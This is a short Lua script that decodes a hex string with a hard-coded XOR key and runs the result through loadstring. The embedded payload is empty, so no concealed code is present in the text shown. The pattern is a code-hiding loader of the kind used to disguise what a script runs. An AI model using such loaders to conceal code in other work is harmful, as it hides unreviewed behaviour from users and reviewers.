local k={42,152,135,197,36,58,135,152,165,177,85,179,160,59,211,237,145,246,158,148,37,81,142,128,17,143,153,59,73,3,174,141}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
